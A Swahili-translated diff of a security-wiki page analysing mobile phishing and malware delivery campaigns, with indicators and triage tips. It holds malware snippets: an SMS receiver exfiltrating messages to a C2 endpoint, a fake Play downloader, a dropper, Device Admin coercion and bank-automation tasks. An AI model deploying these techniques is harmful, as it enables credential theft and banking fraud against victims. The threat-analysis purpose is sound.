@@ -1,58 +1,65 @@
-# Phishing ya Simu & Usambazaji wa Apps Zenye Madhara (Android & iOS)
+# Phishingi ya Simu Mkono & Usambazaji wa App Zenye Madhara (Android & iOS)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!INFO]
-> Ukurasa huu unafunika mbinu zinazotumika na wahalifu wa tishio kusambaza **malicious Android APKs** na **iOS mobile-configuration profiles** kupitia phishing (SEO, social engineering, maduka bandia, apps za udate, n.k.).
-> Nyenzo imeadaptishwa kutoka kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na utafiti mwingine wa umma.
+> Ukurasa huu unafunika mbinu zinazotumiwa na wahalifu wa tishio kusambaza **malicious Android APKs** na **iOS mobile-configuration profiles** kupitia phishing (SEO, social engineering, maduka ya uongo, dating apps, n.k.). Nyenzo imeadaptishwa kutoka kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na utafiti mwingine wa umma.
 
 ## Mtiririko wa Shambulio
 
-1. **Miundombinu ya SEO/Phishing**
-* Sajili domeini kadhaa zinazofanana (dating, cloud share, car service…).
-– Tumia maneno muhimu katika lugha ya eneo na emojis katika elementi ya `<title>` ili kupata nafasi kwenye Google.
-– Weka maelekezo ya usakinishaji ya Android (`.apk`) na iOS kwenye ukurasa wa kutua mmoja.
-2. **Upakuaji wa Hatua ya Kwanza**
-* Android: link ya moja kwa moja kwenda APK isiyotiwa saini (*unsigned*) au “third-party store” APK.
-* iOS: `itms-services://` au link ya HTTPS kwa profile yenye madhara ya **mobileconfig** (angalia hapa chini).
-3. **Uhandisi wa Kijamii Baada ya Kusakinisha**
-* Kwa mara ya kwanza app itauliza kwa **invitation / verification code** (hisia ya upatikanaji wa kipekee).
-* Msimbo huo unatumwa kwa POST kupitia HTTP kwa Command-and-Control (C2).
+1. **SEO/Phishing Infrastructure**
+* Sajili domain nyingi zinazofanana (dating, cloud share, car service…).
+– Tumia maneno muhimu ya lugha ya eneo na emojis katika elementi ya `<title>` ili kushika nafasi kwenye Google.
+– Host *both* Android (`.apk`) na iOS install instructions kwenye ukurasa mmoja wa kutua.
+2. **Upakuaji wa Awamu ya Kwanza**
+* Android: link ya moja kwa moja kwa APK *unsigned* au “third-party store”.
+* iOS: `itms-services://` au link ya HTTPS plain kwa profaili ya **mobileconfig** yenye madhara (angalia chini).
+3. **Social Engineering Baada ya Kusakinisha**
+* Katika uendeshaji wa kwanza app inauliza kwa **msimbo wa mwaliko / uthibitishaji** (ibua hisia ya ufikiaji wa kipekee).
+* Msimbo unatumwa kwa **HTTP POST** kwenda Command-and-Control (C2).
 * C2 inajibu `{"success":true}` ➜ malware inaendelea.
-* Dynamic analysis ya Sandbox / AV ambayo haitoi msimbo sahihi haiona tabia hatarishi (evasion).
-4. **Matumizi Mabaya ya Ruhusa Wakati wa Runtime** (Android)
-* Ruhusa hatari zinaombwa tu **baada ya jibu chanya kutoka C2**:
+* Uchambuzi wa dynamic wa Sandbox / AV ambao hauwasilishi kamwe msimbo halali hauioni **madhara yoyote ya kibaya** (evasi).
+4. **Matumizi Mabaya ya Vibali Wakati wa Runtime (Android)**
+* Vibali hatari vinaombwa tu **baada ya jibu chanya kutoka C2**:
 ```xml
 <uses-permission android:name="android.permission.READ_CONTACTS"/>
 <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
 <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 <!-- Older builds also asked for SMS permissions -->
 ```
-* Tofauti za hivi karibuni **huondoa `<uses-permission>` kwa SMS kutoka `AndroidManifest.xml`** lakini huacha njia ya Java/Kotlin inayosoma SMS kupitia reflection ⇒ hupunguza alama ya static huku ikibaki kufanya kazi kwenye vifaa vinavyotoa ruhusa kupitia matumizi mabaya ya `AppOps` au malengo ya zamani.
-5. **UI ya Facade & Ukusanyaji wa Background**
-* App inaonyesha views zisizo hatari (SMS viewer, gallery picker) zilitekelezwa ndani ya app.
-* Wakati huo huo inachukua na kutuma nje:
+* Variants za hivi karibuni **huondoa `<uses-permission>` ya SMS kutoka `AndroidManifest.xml`** lakini huacha njia ya Java/Kotlin inayosoma SMS kupitia reflection ⇒ hupunguza score ya static huku ikibaki kufanya kazi kwenye vifaa vinavyotoa ruhusa kupitia `AppOps` abuse au malengo ya zamani.
+5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
+* Android 13 ilianzisha **Restricted settings** kwa apps zilizosidlodaliwa: vitufe vya Accessibility na Notification Listener vimezimwa hadi mtumiaji aweke wazi restricted settings kwenye **App info**.
+* Kurasa za phishing na droppers sasa zinatoa maelekezo ya hatua‑kwa‑hatua za UI ili **kuruhusu restricted settings** kwa app iliyosidlodaliwa na kisha kuwezesha Accessibility/Notification access.
+* Bypass mpya ni kusakinisha payload kupitia **session‑based PackageInstaller flow** (njia ileile app stores wanayotumia). Android huchukulia app kama imewekwa kupitia store, hivyo Restricted settings haisambazi tena Accessibility.
+* Vidokezo vya triage: katika dropper, grep kwa `PackageInstaller.createSession/openSession` pamoja na code inayomuelekeza mara moja mhanga kwenda `ACTION_ACCESSIBILITY_SETTINGS` au `ACTION_NOTIFICATION_LISTENER_SETTINGS`.
+6. **Facade UI & Kukusanya Taarifa kwa Background**
+* App inaonyesha view zisizo hatari (SMS viewer, gallery picker) zilizotekelezwa local.
+* Wakati huo huo hu-exfiltrate:
 - IMEI / IMSI, nambari ya simu
-- Dump kamili ya `ContactsContract` (JSON array)
-- JPEG/PNG kutoka `/sdcard/DCIM` zimeshinywa kwa kutumia [Luban](https://github.com/Curzibn/Luban) kupunguza ukubwa
-- Yenye hiari: maudhui ya SMS (`content://sms`)
-Payloads zinachukuliwa kama **batch-zipped** na kutumwa kwa `HTTP POST /upload.php`.
-6. **Mbinu ya Usambazaji ya iOS**
-* Profaili moja ya **mobile-configuration profile** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. ili kusajili kifaa katika usimamizi unaofanana na “MDM”.
+- Dump kamili ya `ContactsContract` (array ya JSON)
+- JPEG/PNG kutoka `/sdcard/DCIM` compress kwa kutumia [Luban](https://github.com/Curzibn/Luban) kupunguza ukubwa
+- Maudhui ya SMS ya hiari (`content://sms`)
+Payloads huwekwa **batch-zipped** na kutumwa kupitia `HTTP POST /upload.php`.
+7. **Mbinu ya Kusambaza iOS**
+* Profaili moja ya **mobile-configuration** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. ili kujiandikisha kifaa kwa usimamizi wa aina ya “MDM”.
 * Maelekezo ya social-engineering:
-1. Open Settings ➜ *Profile downloaded*.
-2. Taweka *Install* mara tatu (picha za skrini kwenye ukurasa wa phishing).
-3. Trust the unsigned profile ➜ mshambuliaji anapata *Contacts* & *Photo* entitlement bila ukaguzi wa App Store.
-7. **Tabaka la Mtandao**
-* HTTP wazi, mara nyingi kwenye port 80 na HOST header kama `api.<phishingdomain>.com`.
-* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → rahisi kugundua).
+1. Fungua Settings ➜ *Profile downloaded*.
+2. Gusa *Install* mara tatu (picha za skrini kwenye ukurasa wa phishing).
+3. Amini profaili isyosainiwa ➜ mshambuliaji anapata ruhusa za *Contacts* & *Photo* bila kupitia App Store review.
+8. **iOS Web Clip Payload (ikoni ya app ya phishing)**
+* `com.apple.webClip.managed` payloads zinaweza **kupachika URL ya phishing kwenye Home Screen** na ikoni/lebeli yenye chapa.
+* Web Clips zinaweza kuendesha **full‑screen** (zinatuma browser UI) na zitaweza kuwekwa **non‑removable**, kulazimisha mhusika kufuta profaili ili kuondoa ikoni.
+9. **Tabaka la Mtandao**
+* HTTP plain, mara nyingi kwenye port 80 na HOST header kama `api.<phishingdomain>.com`.
+* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → rahisi kutambua).
 
-## Vidokezo za Red-Team
+## Vidokezo kwa Red-Team
 
-* **Dynamic Analysis Bypass** – Wakati wa tathmini ya malware, otomatisha awamu ya msimbo wa mwaliko kwa kutumia Frida/Objection ili kufikia tawi lenye madhara.
-* **Manifest vs. Runtime Diff** – Linganisha `aapt dump permissions` na runtime `PackageManager#getRequestedPermissions()`; kukosekana kwa ruhusa hatarishi ni ishara ya hatari.
-* **Network Canary** – Sanidi `iptables -p tcp --dport 80 -j NFQUEUE` kugundua mlipuko wa POST zisizo thabiti baada ya kuingiza msimbo.
-* **mobileconfig Inspection** – Tumia `security cms -D -i profile.mobileconfig` kwenye macOS kuorodhesha `PayloadContent` na kugundua idhini kupita kiasi.
+* **Dynamic Analysis Bypass** – Wakati wa tathmini ya malware, automate hatua ya msimbo wa mwaliko kwa kutumia Frida/Objection ili kufikia njia yenye madhara.
+* **Manifest vs. Runtime Diff** – Linganisha `aapt dump permissions` na runtime `PackageManager#getRequestedPermissions()`; ukosefu wa vibali hatari ni alama ya hatari.
+* **Network Canary** – Sanidi `iptables -p tcp --dport 80 -j NFQUEUE` kugundua mfululizo wa POST zisizo za kawaida baada ya kuingiza msimbo.
+* **mobileconfig Inspection** – Tumia `security cms -D -i profile.mobileconfig` kwenye macOS kuorodhesha `PayloadContent` na kugundua ruhusa za kupita kiasi.
 
 ## Useful Frida Snippet: Auto-Bypass Invitation Code
 
@@ -78,7 +85,7 @@ return conn;
 ```
 </details>
 
-## Viashiria (Za Kawaida)
+## Viashiria (Za Jumla)
 ```
 /req/checkCode.php        # invite code validation
 /upload.php               # batched ZIP exfiltration
@@ -88,28 +95,28 @@ LubanCompress 1.1.8       # "Luban" string inside classes.dex
 
 ## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern
 
-Mfumo huu umeonekana katika kampeni zinazotumilia mada za misaada ya serikali ili kuiba kredenshali za UPI za India na OTPs. Waendeshaji wanachanganya majukwaa yenye sifa kwa ajili ya usambazaji na ustahimilivu.
+Muundo huu umeonekana katika kampeni zinazotumia mada za faida za serikali ili kuiba nyaraka za UPI za India na OTPs. Waendeshaji hufuata mtiririko wa majukwaa yanayoaminika kwa ajili ya utoaji na udumu.
 
 ### Delivery chain across trusted platforms
 - YouTube video lure → maelezo yana kiungo kifupi
-- Kiungo kifupi → tovuti ya phishing kwenye GitHub Pages ikijitia portal halali
-- Repo moja ya GitHub inahifadhi APK yenye badge bandia ya “Google Play” inayounganisha moja kwa moja kwa faili
-- Kurasa za phishing zinazobadilika zinaishi kwenye Replit; chanzo cha amri kwa mbali kinatumia Firebase Cloud Messaging (FCM)
+- Shortlink → GitHub Pages phishing site inajiiga portal halali
+- Repo sawa la GitHub linahifadhi APK yenye beji bandia ya “Google Play” inayounganisha moja kwa moja kwenye faili
+- Kurasa za phishing zinazobadilika zinaishi Replit; chaneli ya amri ya mbali inatumia Firebase Cloud Messaging (FCM)
 
-### Dropper with embedded payload and offline install
-- APK ya kwanza ni installer (dropper) ambayo husafirisha malware halisi katika `assets/app.apk` na kuamsha mtumiaji kuzima Wi‑Fi/data za simu ili kupunguza ugunduzi wa cloud.
-- Payload iliyojengwa ndani inasakinishwa chini ya lebo isiyoibua mashaka (mfano, “Secure Update”). Baada ya usakinishaji, msakinishaji na payload wote wawili hupatikana kama apps tofauti.
+### Dropper na embedded payload na usakinishaji bila mtandao
+- APK ya kwanza ni installer (dropper) inayobeba malware halisi katika `assets/app.apk` na kuomba mtumiaji kuzima Wi‑Fi/mobile data ili kupunguza utambuzi wa cloud.
+- The embedded payload inasakinishwa chini ya lebo isiyoshukiwa (e.g., “Secure Update”). Baada ya usakinishaji, both the installer and the payload zipo kama apps tofauti.
 
-Ushauri wa triage ya static (grep kwa payloads zilizojengwa ndani):
+Kidokezo cha triage ya static (grep for embedded payloads):
 ```bash
 unzip -l sample.apk | grep -i "assets/app.apk"
 # Or:
 zipgrep -i "classes|.apk" sample.apk | head
 ```
-### Ugunduzi wa endpoints unaotegemea mabadiliko kupitia shortlink
-- Malware hupakua orodha ya plain-text, iliyotengwa kwa koma ya endpoints zinazoishi kutoka kwenye shortlink; mabadiliko rahisi ya string hutengeneza path ya mwisho ya ukurasa wa phishing.
+### Ugunduzi wa endpoints unaobadilika kupitia shortlink
+- Malware hupakua orodha ya plain-text, iliyotenganishwa kwa koma, ya endpoints hai kutoka shortlink; mabadiliko rahisi ya string hutoa njia ya mwisho ya ukurasa wa phishing.
 
-Mfano (imesafishwa):
+Mfano (imerekebishwa):
 ```
 GET https://rebrand.ly/dclinkto2
 Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
@@ -117,7 +124,7 @@ Transform: "gate.html" → "gate.htm" (loaded in WebView)
 UPI credential POST: https://sqcepo.replit.app/addup.php
 SMS upload:           https://sqcepo.replit.app/addsm.php
 ```
-Pseudokodi:
+Pseudokodhi:
 ```java
 String csv = httpGet(shortlink);
 String[] parts = csv.split(",");
@@ -125,8 +132,8 @@ String upiPage = parts[0].replace("gate.html", "gate.htm");
 String smsPost = parts[1];
 String credsPost = upiPage.replace("gate.htm", "addup.php");
 ```
-### WebView-based UPI credential harvesting
-- Hatua ya “Make payment of ₹1 / UPI‑Lite” inapakia fomu ya HTML ya mshambuliaji kutoka kwa endpoint ya dinamiki ndani ya WebView na inakusanya mashamba nyeti (namba ya simu, benki, UPI PIN) ambayo zina`POST`wa kwa `addup.php`.
+### Kuchuma credentials za UPI kwa kutumia WebView
+- Hatua ya “Make payment of ₹1 / UPI‑Lite” inaleta fomu ya HTML ya mshambuliaji kutoka kwenye dynamic endpoint ndani ya WebView na inakusanya nyanja nyeti (nambari ya simu, benki, UPI PIN) ambazo zinafanywa `POST` kwa `addup.php`.
 
 Minimal loader:
 ```java
@@ -134,7 +141,7 @@ WebView wv = findViewById(R.id.web);
 wv.getSettings().setJavaScriptEnabled(true);
 wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
 ```
-### Kuenea binafsi na kuingilia kati kwa SMS/OTP
+### Self-propagation and SMS/OTP interception
 - Ruhusa kali zinaombwa wakati wa kuendesha kwa mara ya kwanza:
 ```xml
 <uses-permission android:name="android.permission.READ_CONTACTS"/>
@@ -142,10 +149,10 @@ wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
 <uses-permission android:name="android.permission.READ_SMS"/>
 <uses-permission android:name="android.permission.CALL_PHONE"/>
 ```
-- Wasiliano zinapitia mzunguko ili kutuma kwa wingi smishing SMS kutoka kwenye kifaa cha mwathiriwa.
-- SMS zinazoingia zinakamatiwa na broadcast receiver na kupakiwa pamoja na metadata (mtumaji, maudhui, SIM slot, per-device random ID) kwenye `/addsm.php`.
+- Mawasiliano hurudiwa ili kutuma kwa wingi smishing SMS kutoka kwenye kifaa cha mwathirika.
+- SMS zinazoingia zinakamatwa na broadcast receiver na hutumwa pamoja na metadata (sender, body, SIM slot, per-device random ID) kwenda `/addsm.php`.
 
-Mfano wa broadcast receiver:
+Kielelezo cha receiver:
 ```java
 public void onReceive(Context c, Intent i){
 SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
@@ -159,10 +166,10 @@ postForm(urlAddSms, new FormBody.Builder()
 }
 }
 ```
-### Firebase Cloud Messaging (FCM) as resilient C2
-- Payload husajiliwa kwa FCM; ujumbe za push zinabeba uwanja `_type` unaotumika kama swichi kuanzisha vitendo (mf., sasisha templates za maandishi za phishing, badilisha tabia).
+### Firebase Cloud Messaging (FCM) kama C2 yenye ustahimili
+- Payload inajiandikisha kwenye FCM; push messages zinaabeba uwanja `_type` unaotumika kama switch kuanzisha vitendo (kwa mfano, sasisha violezo vya maandishi vya phishing, badilisha tabia).
 
-Example FCM payload:
+Mfano wa payload ya FCM:
 ```json
 {
 "to": "<device_fcm_token>",
@@ -172,7 +179,7 @@ Example FCM payload:
 }
 }
 ```
-Rasimu ya Handler:
+Handler rasimu:
 ```java
 @Override
 public void onMessageReceived(RemoteMessage msg){
@@ -184,24 +191,24 @@ case "smish": sendSmishToContacts(); break;
 }
 }
 ```
-### Viashiria/IOCs
+### Viashiria/IOC
 - APK ina secondary payload katika `assets/app.apk`
-- WebView inapakia malipo kutoka `gate.htm` na inafanya exfiltration kwa `/addup.php`
+- WebView inaleta payment kutoka `gate.htm` na hu-exfiltrate kwa `/addup.php`
 - SMS exfiltration kwa `/addsm.php`
-- Shortlink-driven config fetch (mfano, `rebrand.ly/*`) ikirudisha endpoints za CSV
-- Apps zinazoonekana kama generic “Update/Secure Update”
-- FCM `data` messages zenye discriminator `_type` katika apps zisizo za kuaminika
+- Shortlink-driven config fetch (mf., `rebrand.ly/*`) kurudisha CSV endpoints
+- Apps zenye lebo za kijumla “Update/Secure Update”
+- FCM `data` messages zenye `_type` discriminator katika untrusted apps
 
 ---
 
 ## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
 
-Wavamizi wanabadilisha viungo thabiti vya APK kwa kutumia channel ya Socket.IO/WebSocket iliyojumuishwa katika lures zinazoonekana kama Google Play. Hii inaficha payload URL, inavuka vichujio vya URL/extension, na inahifadhi install UX ya kweli.
+Wavamizi wanazidi kubadilisha viungo thabiti vya APK kwa chaneli ya Socket.IO/WebSocket iliyowekwa ndani ya vichocheo vinavyoonekana kama Google Play. Hii inaficha URL ya payload, inapita vichujio vya URL/extension, na inahifadhi uzoefu wa usakinishaji unaoonekana halisi (install UX).
 
-Mtiririko wa kawaida wa client ulioshuhudiwa uwanjani:
+Mtiririko wa kawaida wa mteja ulioshuhudiwa katika mazingira halisi:
 
 <details>
-<summary>Socket.IO fake Play downloader (JavaScript)</summary>
+<summary>Downloader bandia wa Play wa Socket.IO (JavaScript)</summary>
 ```javascript
 // Open Socket.IO channel and request payload
 const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
@@ -223,9 +230,9 @@ document.body.appendChild(a); a.click();
 ```
 </details>
 
-Kwa nini huvuka udhibiti rahisi:
-- Hakuna URL ya APK ya static inayofichuliwa; payload inajengwa tena ndani ya kumbukumbu kutoka kwa WebSocket frames.
-- URL/MIME/extension filters ambazo zinazuia majibu ya moja kwa moja ya .apk zinaweza kupuuza binary data iliyopitishwa kupitia WebSockets/Socket.IO.
+Kwa nini inaepuka udhibiti rahisi:
+- Hakuna URL ya APK ya statiki inayoonyeshwa; payload inajengwa upya katika memory kutoka kwa WebSocket frames.
+- URL/MIME/extension filters ambazo zinazuia majibu ya moja kwa moja ya .apk zinaweza kukosa data ya binary iliyotunelishwa kupitia WebSockets/Socket.IO.
 - Crawlers na URL sandboxes ambazo hazitekelezi WebSockets hazitapata payload.
 
 Angalia pia WebSocket tradecraft and tooling:
@@ -235,15 +242,14 @@ Angalia pia WebSocket tradecraft and tooling:
 {{#endref}}
 
 
-## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Somo la kesi la RatOn
+## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Kisa cha RatOn
 
-The RatOn banker/RAT campaign (ThreatFabric) ni mfano halisi wa jinsi operesheni za kisasa za mobile phishing zinavyochanganya WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, na hata NFC-relay orchestration. Sehemu hii inatoa muhtasari wa mbinu zinazoweza kutumika tena.
+Kampeni ya RatOn banker/RAT (ThreatFabric) ni mfano thabiti wa jinsi operesheni za kisasa za mobile phishing zinavyochanganya WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, na hata NFC-relay orchestration. Sehemu hii inatoa muhtasari wa mbinu zinazoweza kutumika tena.
 
-### Stage-1: WebView → native install bridge (dropper)
+### Hatua-1: WebView → native install bridge (dropper)
+Wavamizi huonyesha WebView inayofungua ukurasa wa mshambuliaji na kuingiza interface ya JavaScript inayofichua native installer. Kugusa kitufe cha HTML huita native code ambayo inasakinisha APK ya hatua ya pili iliyobundled katika assets za dropper na kisha kuizindua moja kwa moja.
 
-Wavamizi huonyesha WebView inayorejea kwenye ukurasa wa attacker na kuingiza JavaScript interface inayofichua native installer. Kugusa kifungo cha HTML huita native code ambayo inasakinisha APK ya hatua ya pili iliyounganishwa katika assets za dropper kisha kuizindua moja kwa moja.
-
-Mfano mdogo:
+Minimal pattern:
 
 <details>
 <summary>Mfano mdogo wa Stage-1 dropper (Java)</summary>
@@ -287,13 +293,13 @@ Intent i = new Intent();
 i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
 startActivity(i);
 ```
-Wazo la kutafuta tishio: untrusted apps zinazoita `addJavascriptInterface()` na kufichua installer-like methods kwa WebView; APK ikileta payload ya pili iliyojengewa ndani `assets/` na kuitisha Package Installer Session API.
+Wazo la ufuatiliaji: apps zisizoaminika zinazoita `addJavascriptInterface()` na kufichua njia zinazoonekana kama installer kwa WebView; APK inayoleta payload ya pili iliyojikisha chini ya `assets/` na kuitisha Package Installer Session API.
 
-### Mfereji wa idhini: Accessibility + Device Admin + follow-on runtime prompts
-Stage-2 inafungua WebView inayoshikilia ukurasa wa “Access”. Kitufe chake kinaita exported method inayompeleka madhulumiwa kwenye mipangilio ya Accessibility na kuomba kuwezesha huduma ya rogue. Mara inaporuhusiwa, malware inatumia Accessibility kubonyeza kiotomatiki kupitia mazungumzo ya ruhusa za runtime yaliyofuata (contacts, overlay, manage system settings, etc.) na kuomba Device Admin.
+### Mfereji wa idhini: Accessibility + Device Admin + mialiko ya runtime inayofuata
+Stage-2 hufungua WebView inayohifadhi ukurasa wa “Access”. Kitufe chake kinaleta exported method ambayo inaelekeza mwathiriwa kwenye Accessibility settings na kuomba kuwezesha huduma haribifu. Mara inapokubaliwa, malware inatumia Accessibility kubofya kwa njia ya automatiska kupitia dialog za ruhusa za runtime zinazofuata (contacts, overlay, manage system settings, etc.) na kuomba Device Admin.
 
-- Accessibility kwa programu husaidia kukubali maombi ya baadaye kwa kutafuta vitufe kama “Allow”/“OK” katika node-tree na kutekeleza bonyeza.
-- Kukagua/kuomba ruhusa ya Overlay:
+- Accessibility kwa njia ya programu husaidia kukubali mialiko inayofuata kwa kutafuta vitufe kama “Allow”/“OK” katika node-tree na kubofya.
+- Ukaguzi/ombi la ruhusa ya overlay:
 ```java
 if (!Settings.canDrawOverlays(ctx)) {
 Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -308,18 +314,18 @@ See also:
 {{#endref}}
 
 ### Overlay phishing/ransom via WebView
-Operators can issue commands to:
-- render a full-screen overlay from a URL, or
-- pass inline HTML that is loaded into a WebView overlay.
+Operators wanaweza kutoa commands za:
+- kuonyesha overlay ya skrini nzima kutoka URL, au
+- kupitisha inline HTML inayopakiwa ndani ya WebView overlay.
 
-Likely uses: coercion (PIN entry), wallet opening to capture PINs, ransom messaging. Keep a command to ensure overlay permission is granted if missing.
+Likely uses: coercion (PIN entry), kufungua wallet ili kunasa PINs, ransom messaging. Hifadhi command ya kuhakikisha overlay permission imepewa ikiwa haipo.
 
 ### Remote control model – text pseudo-screen + screen-cast
-- Low-bandwidth: periodically dump the Accessibility node tree, serialize visible texts/roles/bounds and send to C2 as a pseudo-screen (commands like `txt_screen` once and `screen_live` continuous).
-- High-fidelity: request MediaProjection and start screen-casting/recording on demand (commands like `display` / `record`).
+- Low-bandwidth: mara kwa mara dump Accessibility node tree, serialize visible texts/roles/bounds na itume kwa C2 kama pseudo-screen (commands kama `txt_screen` mara moja na `screen_live` kuendelea).
+- High-fidelity: omba MediaProjection na anza screen-casting/recording kwa mahitaji (commands kama `display` / `record`).
 
-### ATS playbook (bank app automation)
-Given a JSON task, open the bank app, drive the UI via Accessibility with a mix of text queries and coordinate taps, and enter the victim’s payment PIN when prompted.
+### ATS playbook (automation ya app ya benki)
+Kwa kazi ya JSON, fungua app ya benki, endesha UI kupitia Accessibility kwa mchanganyiko wa queries za maandishi na taps kwa kuratibu, na ingiza PIN ya malipo ya mwathiriwa wakati itapoombwa.
 
 Example task:
 ```json
@@ -331,68 +337,67 @@ Example task:
 "name": "ACME"
 }
 ```
-Example texts seen in one target flow (CZ → EN):
+Mfano wa maandishi yanayoonekana katika mtiririko mmoja wa lengo (CZ → EN):
 - "Nová platba" → "Malipo mapya"
 - "Zadat platbu" → "Ingiza malipo"
 - "Nový příjemce" → "Mpokeaji mpya"
 - "Domácí číslo účtu" → "Nambari ya akaunti ya ndani"
 - "Další" → "Ifuatayo"
 - "Odeslat" → "Tuma"
-- "Ano, pokračovat" → "Ndio, endelea"
+- "Ano, pokračovat" → "Ndiyo, endelea"
 - "Zaplatit" → "Lipa"
 - "Hotovo" → "Imekamilika"
 
-Waendeshaji pia wanaweza kuangalia/kuongeza mipaka ya uhamisho kupitia amri kama `check_limit` na `limit` ambazo huzunguka UI ya mipaka kwa njia sawa.
+Waendeshaji pia wanaweza kukagua au kuongeza mipaka ya uhamisho kupitia amri kama `check_limit` na `limit`, ambazo zinaendesha UI ya mipaka kwa njia sawa.
 
 ### Crypto wallet seed extraction
-Malengo kama MetaMask, Trust Wallet, Blockchain.com, Phantom. Mtiririko: fungua (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Tekeleza locale-aware selectors (EN/RU/CZ/SK) ili kuimarisha urambazaji katika lugha tofauti.
+Malengo kama MetaMask, Trust Wallet, Blockchain.com, Phantom. Mtiririko: fungua (PIN iliyoporwa au nenosiri lililotolewa), nenda kwenye Security/Recovery, ifunue/onyesha seed phrase, keylog/exfiltrate it. Tekeleza locale-aware selectors (EN/RU/CZ/SK) ili kudumisha utulivu wa urambazaji katika lugha tofauti.
 
 ### Device Admin coercion
-Device Admin APIs hutumiwa kuongeza fursa za PIN-capture na kumkera mwathiriwa:
-
-- Kufunga mara moja:
+Device Admin APIs zinatumika kuongeza fursa za kunasa PIN na kuwakatisha tamaa mwathiriwa:
+- Kufunga papo hapo:
 ```java
 dpm.lockNow();
 ```
-- Fanya cheti cha sasa kusitishwa ili kulazimisha mabadiliko (Accessibility inakamata PIN/neno la siri mpya):
+- Kufanya credential ya sasa iishe ili kulazimisha mabadiliko (Accessibility inakamata PIN/password mpya):
 ```java
 dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
 ```
-- Lazimisha kufungua isiyo ya biometriki kwa kuzima vipengele vya biometriki vya keyguard:
+- Lazimisha ufunguzi usiotumia biometric kwa kuzima keyguard biometric features:
 ```java
 dpm.setKeyguardDisabledFeatures(admin,
 DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
 DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
 ```
-Kumbuka: Kontoli nyingi za DevicePolicyManager zinahitaji Device Owner/Profile Owner kwenye Android za hivi karibuni; baadhi ya matoleo ya OEM yanaweza kuwa dhaifu. Thibitisha kila mara kwenye OS/OEM lengwa.
+Kumbuka: Udhibiti mwingi wa DevicePolicyManager unahitaji Device Owner/Profile Owner kwenye Android za hivi karibuni; baadhi ya builds za OEM zinaweza kuwa dhaifu. Daima thibitisha kwenye OS/OEM lengwa.
 
-### Uratibu wa relay ya NFC (NFSkate)
-Stage-3 inaweza kusakinisha na kuanzisha moduli ya relay ya NFC ya nje (mf., NFSkate) na hata kumpa template ya HTML kumwelekeza mhanga wakati wa relay. Hii inawawezesha cash-out ya card-present isiyo ya kugusa pamoja na online ATS.
+### NFC relay orchestration (NFSkate)
+Stage-3 inaweza kusanidi na kuanzisha moduli ya nje ya NFC-relay (mfano, NFSkate) na hata kumkabidhi templeti ya HTML kumwongoza mwathiriwa wakati wa relay. Hii inaruhusu cash-out ya contactless card-present sambamba na ATS ya mtandaoni.
 
 Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).
 
-### Seti ya amri za Operator (mfano)
-- UI/state: `txt_screen`, `screen_live`, `display`, `record`
-- Social: `send_push`, `Facebook`, `WhatsApp`
+### Operator command set (sample)
+- UI/hali: `txt_screen`, `screen_live`, `display`, `record`
+- Kijamii: `send_push`, `Facebook`, `WhatsApp`
 - Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
 - Wallets: `metamask`, `trust`, `blockchain`, `phantom`
 - ATS: `transfer`, `check_limit`, `limit`
-- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
-- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
+- Kifaa: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
+- Mawasiliano/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
 - NFC: `nfs`, `nfs_inject`
 
-### Accessibility-driven ATS anti-detection: mdundo wa maandishi kama wa binadamu na utoaji mara mbili wa maandishi (Herodotus)
+### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)
 
-Watendaji wa vitisho wanazidisha kuchanganya automation inayotegemea Accessibility na anti-detection iliyosawazishwa dhidi ya biometrics za tabia za msingi. Banker/RAT ya hivi karibuni inaonyesha njia mbili za utoaji wa maandishi zinazokamilishana na swichi ya operator kuiga uandishi wa kibinadamu kwa mdundo uliopangwa nasibu.
+Watendaji wa vitisho wanachanganya zaidi na zaidi automatisering inayoendeshwa na Accessibility na mbinu za anti-detection zilizobadilishwa dhidi ya biometrics za tabia za msingi. Banker/RAT ya hivi karibuni inaonyesha modi mbili zinazosaidiana za utoaji wa maandishi na toggle ya operator kuiga uandishi wa kibinadamu kwa midundo iliyopangwa kwa nasibu.
 
